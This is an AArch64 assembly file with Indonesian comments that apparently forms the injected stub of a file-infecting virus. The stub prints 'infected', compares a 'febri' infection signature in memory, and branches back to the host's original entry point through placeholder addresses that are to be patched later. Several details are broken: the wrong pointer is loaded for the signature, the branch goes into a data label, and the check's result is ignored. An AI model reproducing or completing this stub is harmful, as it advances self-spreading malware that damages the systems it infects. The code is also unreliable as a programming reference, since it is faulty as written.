.section .rodata
msg:
    .ascii "infected\n"

sig_str:
    .ascii "febri"

.section .text
.global _start
_start:
    // print "infected\n"
    mov x8, 64          // syscall write
    mov x0, 1           // stdout
    ldr x1, =msg
    mov x2, 9
    svc #0

    // cek signature "febri" di memori
    // alamat signature kita patch nanti sebagai sym 'sig_addr'
    ldr x1, =sig_str_len
    ldr x0, =sig_addr      // alamat signature di memori, patch nanti
    mov x2, 5              // panjang "febri"
    bl check_signature

    // lompat ke entry point asli
    ldr x0, =orig_entry
    br x0

// fungsi cek signature, sederhana: banding byte per byte
// input: x0=addr memori signature, x2=length, x1=pointer string signature
// return: x0=0 jika cocok, !=0 jika gagal
check_signature:
    mov x3, #0            // index
.loop:
    cmp x3, x2
    beq .done
    ldrb w4, [x0, x3]
    ldrb w5, [x1, x3]
    cmp w4, w5
    b.ne .fail
    add x3, x3, #1
    b .loop
.fail:
    mov x0, #1
    ret
.done:
    mov x0, #0
    ret

.section .data
sig_addr:
    .quad 0xAAAAAAAAAAAAAAAA   // placeholder alamat signature, patch nanti

.orig_entry_val:
    .quad 0xBBBBBBBBBBBBBBBB   // placeholder alamat entry asli, patch nanti

orig_entry:
    .quad .orig_entry_val

sig_str_len:
    .quad 5
